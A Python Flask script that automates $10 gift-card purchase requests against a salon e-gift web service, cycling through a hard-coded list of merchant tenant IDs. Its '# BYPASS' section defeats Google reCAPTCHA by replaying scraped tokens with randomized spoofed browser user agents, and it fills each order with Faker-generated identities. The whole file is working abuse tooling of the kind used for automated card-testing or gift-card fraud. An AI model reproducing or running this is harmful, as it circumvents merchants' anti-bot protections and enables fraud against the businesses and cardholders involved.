import json
import re
import random
from faker import Faker
from flask import Flask, jsonify
import httpx

app = Flask(__name__)

def cap(string, start, end):
    return re.search(f'{re.escape(start)}(.*?){re.escape(end)}', string).group(1)

def Capture(string, starting_word, ending_word):
    substring_start = string.find(starting_word)
    substring_start += len(starting_word)
    size = string.find(ending_word, substring_start) - substring_start
    return string[substring_start:substring_start+size]

@app.route('/process', methods=['GET'])
def process():
    # Tenant/Template
    ids = ['101032|592faa18-5887-49da-a878-ab040111017c', '101060|757787b1-3533-4dda-99ab-ab4201177751', '101093|38a71632-5e92-4710-8546-ab59013ab3a6', '101113|17d4ff77-14fe-49b3-8dbb-ab3d01081c48', '101117|efa5ec56-b802-4998-a8d5-ab4b015d4f64', '101147|f2fbc90b-9129-4a7e-887e-ad4a01715945', '101131|8217837e-7050-4f0c-b361-ab90010b8327', '101154|de4a8494-a777-4a84-a133-ac9900e732be', '101161|9c6cbd76-877a-4251-97b2-abbb010bb107', '101128|f9c378da-b68b-4082-838a-abb30139910a', '101194|96972608-7766-41f6-ad99-ab4200fb4c33', '101210|c024b74c-efed-4311-a0bf-ab6b0154c5e5', '101228|c64d84e6-98fb-4079-8c4b-ab73013b5c76', '101217|ca5189f3-fd3c-4843-b855-ab5d00fad3be', '101234|662e2889-d25d-41d7-8c9a-ab5d0024f3f7', '101282|3a961cd5-2f74-46a8-b407-ab8100ce8922', '101236|ad3c5271-2709-49a5-8f2b-ab7300f4eccf', '101302|c6129e44-91c4-4b01-98b1-af9b01113b47', '101296|fca154f6-0cbd-41a0-9281-ab820144c83f', '101318|715d3feb-b8bc-4029-9b9b-abcf012a8e7f', '101307|99e6b5c1-6d57-432f-9b76-ac140179aa53', '101378|ab8dcfc3-3a97-482f-815b-abf8010f2a7c', '101398|441e1556-60e6-4cc4-b834-ab9f00f8754f', '101413|facd33dd-b840-4a50-9066-ac0e015a0aa2', '101432|bd5dd145-e76f-4726-a20b-ac07012137a0', '101437|7f954979-8080-41ae-8fcf-ac10012bd9ea', '101443|31d795f7-ab89-423e-a163-abc200fc3ea6', '101449|fb926c24-ad06-4006-9f61-ad4b00f3da8c', '101457|0271f8b9-cbae-44c8-afd5-abe20101de7c', '101481|5bf29d26-81d8-47a5-8ab0-ad7100f8d1d4', '101542|fdf07962-5cb9-4b6f-b937-acbb015ceba6', '101493|ae069d4b-13ec-473e-a8d8-abd000e3f429', '101557|4c966fd7-faca-4525-a0e0-abc7012d34e3', '101566|e642bf76-6da7-42eb-907b-adaa017d04d1', '101574|7013880f-aaec-44af-9f2e-ad7a01457d01', '101570|26efbbdb-aaa9-4266-9c3e-abc100f9459c', '101590|fb22f47e-7900-49ce-b2c1-af3f014a2cb2', '101585|42aba6e6-76b0-4df6-947a-abb601813230', '101589|fe5c0b81-aea5-4178-a869-abec0135b47d', '101619|42cd627f-314b-4d33-bc0a-abd500f53ae7', '101631|e7e00bca-4999-4352-b974-abbc00ee961a', '101651|00a971d6-76a2-48e8-9d8f-abc001451757', '101658|b9cb8536-a143-4e33-a989-ac1601623f80', '101670|61b654a8-329d-4ac0-9694-ad7300eeffc9', '101659|d5a17322-5776-4bad-ab9b-abdb00eb6ffc', '101668|29235800-a03a-41c3-ac25-ac070173fb48', '101691|f8bcdb24-2e2d-4744-8c8b-acc600fdf536', '101680|b39aae27-7fe9-46ff-bae6-abdf0150079e', '101702|34bd0108-dccd-450e-9663-abcb015c14a0', '101729|7e55c307-778d-4bee-9267-ac7700f9a5ac', '101739|082dddcd-3f82-4ff9-9118-abfe00d67f10', '101741|579d6bfc-ec2d-4d2f-9c73-ac83014af425', '101761|57d4024a-4645-4edb-bb8b-ac7e013d4aaa', '101783|c6b6efb0-0d80-4b25-8449-ad4a01453806', '101787|2bede2ab-7e87-44ae-aa3b-ac2100da9aec', '101821|7c17ac0a-20f6-4440-8852-ac2901527cdd', '101839|19653f35-96b6-4682-b5b2-ac6801421e3d', '101842|ee434216-f4d8-4251-9f9b-ac4f0124cf8e', '101831|ed31914a-f73e-48c7-9d0e-ac45011ed863', '101863|e874fddd-1168-493f-883c-ad47016a0962', '101858|dc212cb7-2d75-4bcd-ab7f-ad4901683a92', '101886|e5045298-a2de-44c4-b300-ac2800e35af5', '101887|3d7128fb-99fb-465a-a813-acef012f8d4f', '101907|aed5a250-6a61-4b12-849c-ac950133bf77', '101920|a4a28d44-7b29-47d2-bdae-ac7d015132b1', '101912|d0a47870-57f4-4262-baef-ad6600f30942', '101918|4168bdd0-eafb-4ce3-a6da-ac8801511074', '101939|9d50a3b9-543a-4e70-a01d-ac2a011c4d2e', '101947|5ce4f4f2-7fc7-41a6-8a2c-ac460025cafd', '101961|64da23a9-8aed-498e-ae5b-ac4000e2b290', '101967|176e74c6-437a-49f0-853d-ac50015c390e', '101972|9889e65d-b1ef-4317-ae3c-ad120157a9b4', '101979|5a38071b-3c43-43e4-9edb-ad11013877aa', '101993|ffae25e2-5fcf-450c-a6c1-ad300129c735', '101998|308cc2fc-c484-44a5-86f7-ac4e00de47cc', '101990|36bcb42c-0cbf-400a-bb38-ac4000ecc19d', '102038|a7aefc96-92fb-4679-b251-af720065c269', '102014|d045905b-95bc-47c2-90ab-ad4f0111252c', '102019|989b9b9a-0712-4814-a556-ac5300f2eb0e', '102016|d771924f-007c-462f-8887-ad6d014fdfdc', '102033|9237029a-bda6-49ac-8645-acdc0126cdfd', '102059|362baab5-b584-4602-8d45-ace1010f7d75', '102079|436fc4fd-1bbd-4ba6-b637-ac6700cddc66', '102080|3b2d62a5-b909-4ede-b5d0-ac60003b119f', '102082|326b136c-307a-446b-8ccc-ace4017e8d03', '102081|d1fe93a9-1ae4-40b8-8440-ac82016a87cb', '102100|157eaba4-2af2-4422-8b5e-ac5901230239', '102087|4a0a73a2-88d5-43dd-a839-ad4d014e244c', '102138|2b3df097-d827-4501-a039-ac7000e3ef5d', '102106|a5519e69-84a2-488f-83c8-ac6200c92284', '102139|ba158674-cbf5-4a66-a2ec-ac90015aa87e', '102145|e235aa04-268f-425d-bd21-ac570152af8f', '102177|6ae13cf3-3df5-4371-813c-ad33012fe6c1', '102158|1d747782-3e81-4d7e-9c6e-ac8401737dbd', '102214|df3b4a50-f0f1-4324-8a06-ac7e00e811a2', '102262|2f0d7095-4e96-4e90-bda4-aca501860c9f', '102223|4b8ef275-5f10-4644-8648-acbf010e4758', '102271|aeac5d76-cff4-4fcd-8183-ac920147da43', '102327|2a2a3c57-9097-437f-a3a9-aca600f70cdc', '102323|4d4b9c99-a0aa-4e89-9168-ac80015a1e89', '102340|f8167605-7518-4d2a-899a-aca30133dd29', '102372|fb971848-cf63-4bc9-87fc-acbe015c33de', '102405|420ec18f-21df-4dce-b557-ad7e0102f5e0', '102360|f59399c2-9c8d-4609-9a2b-acc200ee0b62', '102394|af4ec258-6ca7-4c35-a766-acc201138907', '102408|a09db550-ee12-430e-8bcd-acc2010be857', '102415|555d0a68-0f86-4268-b693-ad4b00e54a80', '102452|ec684abe-80ee-473e-b5c1-acd801245d30', '102457|0c15f9b0-3fd6-4864-8888-acbd00ca7b7a', '102509|7c650b57-f0ed-44dd-bf4c-acd80128ad65', '102510|950da282-bc0c-4e13-84ea-ad560133d362', '102615|f018bc66-b655-4fa9-b048-acde01557337', '102626|a4b56aab-bf5b-4b2b-a62a-ad490159f346', '102652|79d3bd4e-82d4-4159-b5ea-ace901283c70', '102661|38bc976a-5dda-4201-9648-ace7013fbebf', '102669|eccb5c1a-0bee-4c53-b4b2-ad6700f0d2f8', '102758|f2a9c4cf-6112-4acd-aa80-ad54014b8ff4', '102782|760025a4-26dc-4073-a754-ad1000e6c78f', '102831|db33ffe6-d508-4dfd-bc2f-ad2300ff27f3', '102852|2cd495bb-08d5-4ac1-bf09-ad4f01552d8f', '102841|e4ed6ee5-561c-4b92-a24d-ad44012a624b', '102908|b225e30b-30af-41eb-b4fa-ad1e012278cb', '102928|11094b20-4707-43c6-bd8e-b0e60175900f', '102909|307d950d-0c5a-46a2-966f-ad4a011744e9', '103052|bc1b2d87-efad-420c-bffb-ad3a01369ece', '102955|5abeb8ea-9aef-40e0-b339-ad41012f66c3', '103070|a77e0bc1-ee6b-43af-8c78-ad630022a76c', '103141|46e9c51c-011c-495b-b28c-ad7f01189813', '103145|1ec2e625-3928-4534-b027-ad6500e20b0d', '103153|2068c2fa-30fd-4da0-8848-ad4a0159afe6', '103192|c16f8ff4-2828-47ff-b886-ad7b00c01e65', '103195|4c615b27-0278-4f57-b933-ad720140e525', '103199|487cc308-c146-47f9-bbf9-ad6b0101dbf8', '103213|d4632a22-390a-49d5-8528-ad3601023f80', '103228|efe093e1-ef6c-419f-acbb-ad6e0011617b', '103233|1ab709ef-d734-4a5c-9485-ad9800f34636', '103247|d6fae327-f856-462c-bcf8-ad5d00fe33a8', '103366|93db32f6-44e1-42e0-883c-ad6a010b4fdc', '103406|0f67cd07-0d00-4739-a02d-ad8e0132fabf', '103455|d2647303-ef1c-4b0f-8997-ad5d00fb567d', '103511|2ae13aaa-22fb-46b0-9819-ad9c0174b06c', '103465|0cca29fa-7500-4f0a-ae46-ad6b013f5dac', '103514|7ba7c99f-5798-4ff7-b45f-ad6e00291c89', '103572|393fb14f-11ec-4045-80ed-ad88016d27da', '103625|41ffb0f1-2c1b-4aa9-94b9-ad9e013d58de', '103593|db22b214-f462-48d4-8c7b-adce00d836be', '103696|63a5f424-48f1-411c-b144-ae9000e455c9', '103727|ecba0501-2a4b-41e1-8df2-ad980144a1c1', '103734|b0fd7fd5-9cee-48d0-8185-ad9f014edde2', '103765|60f24084-f596-470d-b101-adf30173857e', '103815|fe819f2a-6248-45ad-b4d0-adcd00fdc028', '103760|a8ec2cd3-cc90-484e-9c5f-ada20110d048', '103866|991c572c-58bd-4245-8fbd-add5009180dd', '103892|cbada19a-83c4-4280-8eff-adfe001bdb39', '103816|5fa9f66f-a5db-40e7-b04c-add40185b585', '103901|316e6be0-2d53-4fd5-8f94-adf700250a23', '103935|71d7eb2b-8438-4151-bd4f-addd01157855', '103832|63505593-90c3-42b4-815f-ade8010efd46', '103938|b5fb6465-f45e-4d04-a1cf-adce0183438e', '104016|e16dbd1a-67ac-4143-9b74-adf701405c24', '104044|05f8ad47-f0ad-4aad-952e-ae3600d4a6b1', '104067|e3a4834a-bfaa-40e7-92d1-ae06010bf40b', '104060|1ef38337-bc7e-4d09-ad90-af2d0116e669', '104111|15cc7845-48bf-4e39-b750-ae2f0146b27c', '104077|1750f07d-c8e0-4d29-a4ce-ae1201852f62', '104120|c8104b50-81ef-4a3b-9add-ae1c0115333b', '104080|e3f6ed77-552a-45e2-8f7f-ae2700eb50a7', '104170|5de4d055-a1c6-46c3-86b7-ae3c00f61cad', '104192|dbef2195-2710-4f5f-9e2b-ae5300feef01', '104136|cd23fb9a-1ccc-4b25-8b7e-ae35016526e8', '104097|0ada2b93-0aa8-4884-bb07-ae2f016e9bc6']
    chosen_id = random.choice(ids)
    tenant_id, template_TId = chosen_id.split("|")

    # CURL -1
    headers = {
        'Host': 'na0.meevo.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5'
    }

    with httpx.Client() as client:
        response = client.get(f'https://na0.meevo.com/egift/egft/RcToken?tenantId={tenant_id}&version=1&locationId=null&logOut=false&stashId=null', headers=headers)
        data = response.json()

    SID = cap(response.text, '"sessionId":"', '"')
    UID = cap(response.text, '"userId":"', '"')
    TOK = cap(response.text, '"bearerToken":"', '"')

    anchor_link = 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6Lc4z-AUAAAAAOxF55bnvTnPaKm2sDTZN0wrAmet&co=aHR0cHM6Ly9uYTAubWVldm8uY29tOjQ0Mw..&hl=en&v=NZrMWHVy58-S9gVvad9HVGxk&size=invisible&badge=bottomright&cb=7q1yi7bsv8yw'
    anchor_ref = '' # Open Anchor Headers and see the referer link

    reload_link = 'https://www.google.com/recaptcha/api2/reload?k=6Lc4z-AUAAAAAOxF55bnvTnPaKm2sDTZN0wrAmet'
    v = 'NZrMWHVy58-S9gVvad9HVGxk'
    k = '6Lc4z-AUAAAAAOxF55bnvTnPaKm2sDTZN0wrAmet'
    co = 'aHR0cHM6Ly9uYTAubWVldm8uY29tOjQ0Mw..'
    chr = '[38,46,47]'
    bg = '!urygvLkKAAQeCR5ubQEHnAgEUqjy_nRMMvvcBEpQK8z2N1fEE69vKgSfNF95t26PN87XFzZE55fNLJPkvPd3Ogfix5TsApT5Hu0fV-2l2BQ6iaMkAouB0b1FR_X8Dagu4lgwmV6wJWG3RLoIDJLY7kfmlcz_iSzm6_iSGBqTHnEdJ2UjixQUpiCik_zUydRwIYF8Qu_nVTi5DBS0cCuJDBc9S5EJTuInS0IWyKVBqUqZ6WvjNzcg8Or8xuVTUBHo1-prRcDr1lehLDczBJjQ_S6-NeKzajBbR7Hq4gPRnoGTT9mru20CQMdEbeLd3TcrhS8VFzrfUIQfi__CUaIyDwGn-z62Jkemv4b8cF93E1p2IqBAKvnew5Q7VnoLHyJYMnqZV_CJIQlNN7VT9xX14-VrnHji46r8JvYvN9V0Ke0026tHovamrVfnU-97WoNXVXTyeQKqpwVf3BO7QZmO1li9A02bfZGqeNRnOznzR-9eNDZCjBaDLrU2JRd1Ap4XCsxAQ0jwTsdwAgVXijyvc7FGjJVQDV1CzCcNnkuULlLNTGkcN-j9adVBAo8adXOcnEgoUqRoX3zpqxmrSdeQQvtW_MBWsbnDtYqsATNNdnDRRyax7LGR9qoKjOcVGvQb4AOwt3m3ur4RAtWYyy1FWjIiPvQBkOBuGVh2S7fD-wYymZ5z5j29cv0B2JUYZFxZSBDYHy9X6_xbo977jCEGAwueUZ7Sl09RWfMCBHLAMWRm-RReSwb6bHZZK5Qz8l20w1EQsrOe4EdYvDcQmPF5z9J3dayLPnmCktPw_pqBsw8Eo-hdoFxWxSl1JM30Kqj9-UW2BoWm-wS6SX2P047fjZCeHYiWT0rbcwuviw7L73dVJSMsTx2X-WpUQlHqQlhnXza4hOid3cXsxKV9SdybjnMtGI54rrjWgjnAOGCDggF_H0JPKRi1nnfnxj2ewq91ocpRHucSxyeXUtcAmLYoJ2-rXZrWoaMimf29KNEErKF0q2H_Xf5Ovd9WOkDrl5ent2U3-AfyB1KCcT2YWiPTSHQRjj9HG6aj-2QBnLV8a-pPrSjUzE9_HaICVIoDuDUA92CXBcQwK5DbLnb5rmmneD7yrDvn_lj_OhOEof-AISV6b3pGjWtLdIhy7GUHJQ7lqRza4-bejYFjO2DIGUkJLXt3hA0fEdFIYSfit4Ecz7bWzy29a7IiAXnhSUwTw5qcIzjM6esQmh1wBNrGxXfRFNkuAnliw7ex0xO93Pyb63lF_p2YMd7uDDubnEIMzxjLWdZ2HSzpRhrFRzfZ9eDrrG_2vLoIklYS2KmDjpTtvjeFA-CC0xtlJEuQG_66I5mHHD5L_aqTYy2-b3kZPv2uMHu1HJkvnvmALy4U9tgY5FQWvhn6G23pWJYs0sfbyt3M-fYIFlsZsoHPh1lIflt7jeEYtOMCD8ahERdGjAH3KMmN9a6RwVjhnZOGjdKC5lZEtYF0PHFH_Tjb1eaH4eMQ6kzcvudW8H_4OYaToQlNW7qX9tv9wXZikvrtqMPs80Gwh9VoNN2EpcEqIUZJXUAvG-FxPREjTnLteSqx-DN8H6guu_1AEaz0rqgKrpfCLole0T_5W3dktqC5_CFweC0oO3dgMHldkO8oH5gu4tOVHghVYxoTvllo03jcJ1mJlwW2eHNI-UFFaUKqO5QpX2OhGLeIyuzqd7jI4nxiUgg8EeHSJhTar3BjuxISx1dOEpHZV61zO5AMSRV2kOH1YDN14obuyyDEvGiQ_OHPBLs3zGK911nsnLVqELkMBx6uHlfqxzoyOyLkk8O3KIBdlrG9mBgOpbp3tfJea-Vh5nWXgKsuUTt6QaIsnKkr2yvU7tIU-1Cdbn7TrdoMcLPJ-97EUqrnYns9kixIdD0LsSjmhrwaFMdDs5MHyBgFZ1P1SlBPsguFEeWU7aTUuX8Bz57-mVaVI5pSAnrEDisI65OdzBJg2ZwQ4krIrOM_1HkKsx5JpvHPJUiPfxfkrsXvCZ-e6MzvMbp9E63RF-MjUkWATY6g9cRDObulfswoeafaFrt6RUMeg-bi--SrJmZ6JYIFArrff5lQcG3h_1ZX9eiI196DQ7GIfMUeNbK7UK7S8uW32md8vSNIFvD3xuTvdIlKRK4BgWFd7BzPH_krw7CHvdfYI4sBEIh9IRUfx4Zn9WCbECXWly9na68Ux7B9ux7qUEWP6nreRP8eNBZ_SqRVf6JNBhVuNx39L_px8jzRAXCKlkYe32-phEblNI5XfqiFXR4j_Dy8YRWIUM8O5s58J_t-cpeHSVfRqo7c7IUo3ybUrOrWchHrnjD9o4ZAfKzEK_QDxN2zbBQrccmLTyjkrWI779OyZJkMBY7lel4beF7sJMwE3Yu6j1VvhXIRVdV5J6knHRMT_HEAEW8_E0rZLK9ETRU7iGtio3DKlMBT0krgHmd2KX1cvmf8Cl9ygR-RL5eT7MEgoFStzVuPhr8iZ57TDFaq1X_bYGT2c_i1xleAbFMC0Q7zMKrMRiF-HfXDt8agsDF3eKu6zWrEUSTjDywaF--F8vADInSRnmUcPcMq6wydBT5-waxm_3IQxNUJsp-XPEo22HtlyI5LJZ56-nYXIYDl6fQRxM0ps8EjJNZmRYF2VGakao_EezCHj83jOq2DSow2uLGtNxsI704l5Sro9Jt5aGqo4qZgnChXmI3Kv0VUyLld4aJMfcQIxHUawbN4wz5OMzkuF-xSSvMgvrYCqSgrJUXkCh4SIXbKZ2n7d_GA2-vg' 
    vh = '-1020083849'

    # BYPASS
    headers = {
        'authority': 'www.google.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-US,en;q=0.9',
        'referer': anchor_ref,
        'sec-fetch-dest': 'iframe',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'upgrade-insecure-requests': '1',
        'user-agent': f'Mozilla/5.0 (Windows NT {random.randint(11,99)}.0; Win64; x64) AppleWebKit/{random.randint(111,999)}.{random.randint(11,99)} (KHTML, like Gecko) Chrome/{random.randint(11,99)}.0.{random.randint(1111,9999)}.{random.randint(111,999)} Safari/{random.randint(111,999)}.{random.randint(11,99)}'
    }

    with httpx.Client() as client:
        response = client.get(anchor_link, headers=headers)
        rtk = Capture(response.text, '<input type="hidden" id="recaptcha-token" value="', '"')

    data = {
        'v': v,
        'reason': 'q',
        'c': rtk,
        'k': k,
        'co': co,
        'hl': 'en',
        'size': 'invisible',
        'chr': chr,
        'vh': vh,
        'bg': bg
    }

    with httpx.Client() as client:
        response = client.post(reload_link, headers=headers, data=data)
        captcha = Capture(response.text, '["rresp","', '"')

    url = f'https://na0.meevo.com/egift/egft/Sale?tenantId={tenant_id}'
    headers = {
        'Host': 'na0.meevo.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Authorization': f'Bearer {TOK}',
        'Content-Type': 'application/json',
        'Origin': 'https://na0.meevo.com'
    }

    fake = Faker()
    email = fake.email()
    zip_code = fake.zipcode()
    name = fake.first_name()
    last = fake.last_name()

    payload = {
        "giftCards": [
            {
                "templateId": template_TId,
                "emailAddressFrom": email, 
                "emailAddressTo": email,
                "message": f"{name} {last}",
                "fullNameFrom": f"{name} {last}",
                "firstNameTo": name,
                "lastNameTo": last,
                "deliveryMethod": 30545,
                "saleLineItem": {
                    "clientGiftCard": {
                        "remainingAmount": 10
                    },
                    "startDate": "2024-01-28"
                },
                "hideOriginalAmount": False,
                "shippingFeeId": None,
                "shippingAddress": {}
            }
        ],
        "rcToken": captcha,
        "rcVersion": 1,
        "billingPostalCode": "10080"
    }

    # Make the request
    with httpx.Client() as client:
        response = client.post(url, headers=headers, json=payload)
        return jsonify(response.json())

if __name__ == '__main__':
    app.run(debug=True)
